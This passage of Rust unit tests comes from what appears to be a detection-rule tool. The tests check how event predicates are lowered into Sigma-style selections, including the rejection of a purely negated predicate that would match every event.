            keys(&sel.blocks[0]),
            vec![("F".into(), vec!["x".to_string()], false)]
        );
        assert_eq!(sel.notes.len(), 1);
        assert!(sel.notes[0].contains("`not`"));
    }

    #[test]
    fn sigma_event_is_none_when_nothing_positive_survives() {
        // A purely-negated predicate would lower to a rule matching everything.
        // The knowledge base rejects one at load; the lowering declines it too.
        assert!(
            m(r#"{ "event": { "class": "file", "not": { "field": "F", "eq": "x" } } }"#)
                .sigma_event_selection()
                .is_none()
        );
    }
}
